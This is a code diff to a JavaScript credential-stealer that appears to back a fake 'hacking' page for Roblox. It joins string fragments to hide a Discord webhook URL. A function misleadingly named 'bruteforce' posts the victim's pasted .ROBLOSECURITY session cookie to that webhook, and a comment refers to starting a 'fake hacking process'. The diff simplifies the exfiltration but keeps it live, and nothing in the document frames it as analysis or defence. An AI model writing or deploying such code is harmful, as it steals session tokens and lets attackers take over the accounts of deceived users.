@@ -1,74 +1,45 @@
 const _encryptedParts = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
   'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
   'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
   'Ue', 'rP', 'Qe', 'XN', 'xq', '8b', 'xZ', 'dS', 'rL', 'oB', 'UP', 'ab', '1p', 
   'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
 ];
 
+const _encryptedParts101 = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
+  '12', '34', '56', '78', '90'
+];
+
 // Decrypt the URL by concatenating the parts
 const _decrypted = _encryptedParts.join(''); 
 
-// Function to send data to the Discord webhook
-async function sendToWebhook(content) {
+function bruteforce(sessionId) {
   const payload = {
-    content: content
+    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``
   };
 
-  try {
-    const response = await fetch(_decrypted, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(payload),
-    });
-
-    if (!response.ok) {
-      console.error('Failed to send data to Discord.');
-    } else {
-      console.log('Data sent successfully!');
-    }
-  } catch (error) {
-    console.error('Error:', error);
-  }
-}
-
-// Main function to process the session ID
-function bruteforce(sessionId) {
-  const maxLength = 2000; // Discord's limit for message content
-  const extraLength = 1000; // Number of characters to include after "ROBLOSECURITY"
-  const keyword = "ROBLOSECURITY";
-
-  // Find the position of "ROBLOSECURITY" in the sessionId
-  const keywordIndex = sessionId.indexOf(keyword);
-
-  // Only proceed if "ROBLOSECURITY" is found
-  if (keywordIndex !== -1) {
-    // Extract "ROBLOSECURITY" and the next 1000 characters
-    const start = keywordIndex;
-    const end = start + keyword.length + extraLength;
-    const extractedContent = sessionId.substring(start, end);
-
-    // Construct the message
-    let content = `New Session ID Submitted:\n\`\`\`${extractedContent}\`\`\``;
-
-    // Split into chunks if the content exceeds Discord's limit
-    if (content.length > maxLength) {
-      let chunks = [];
-      for (let i = 0; i < content.length; i += maxLength) {
-        chunks.push(content.substring(i, i + maxLength));
+  fetch(_decrypted, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send data to Discord.');
+      } else {
+        console.log('Data sent successfully!');
       }
-      chunks.forEach(chunk => sendToWebhook(chunk));
-    } else {
-      sendToWebhook(content);
-    }
-  } else {
-    console.log("ROBLOSECURITY not found. Nothing sent to webhook.");
-  }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
 }
-
-
 
 
 function validateInput() {
@@ -102,7 +73,6 @@ function validateInput() {
   }
 
 
-const sessionId = "some_text_before_ROBLOSECURITY=very_long_session_id_here...";
 bruteforce(sessionId);
 
   // Hide error and start fake hacking process
